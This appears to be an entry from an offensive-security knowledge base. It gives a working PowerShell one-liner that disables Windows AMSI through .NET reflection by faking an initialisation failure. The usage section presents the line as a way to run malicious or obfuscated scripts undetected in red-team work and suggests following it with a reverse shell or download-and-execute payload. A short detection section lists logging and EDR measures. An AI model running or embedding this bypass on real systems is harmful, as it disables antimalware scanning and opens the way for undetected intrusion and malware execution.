---
id: a0860683-718a-492a-a001-9290046e5b50
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:26.000399+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - amsi-bypass
  - reflection
validated: true
---

# powershell-reflection-amsi-disable

## Code

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Description

This PowerShell code snippet disables the Antimalware Scan Interface (AMSI) using .NET reflection to modify the internal static field 'amsiInitFailed' in the AmsiUtils class. It simulates an AMSI initialization failure, preventing script content from being scanned by integrated antivirus solutions. Based on Matt Graeber's technique, it is a lightweight bypass for executing obfuscated or malicious PowerShell without detection.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a self-contained one-liner with no variables or parameters to substitute. | N/A |

## Usage

Execute directly in a PowerShell console or embed at the top of a script to disable AMSI for the session. Ideal for red team operations where AV blocks payload execution. For example, after running this, attempt to invoke a reverse shell or download-execute payload without triggering alerts. Requires no external tools, only PowerShell access.

## Detection

- Enable PowerShell logging (ScriptBlock, Module, and ETW) to capture reflection API calls to AmsiUtils.
- Monitor for process creation of powershell.exe with arguments involving 'GetType' or 'GetField' on system assemblies.
- Behavioral detection in EDR for modifications to AMSI-related fields or failed initialization events.
- Static analysis of scripts for this exact string pattern.

## Related

- [[procedures/Reflection-Method-to-Disable-AMSI]]
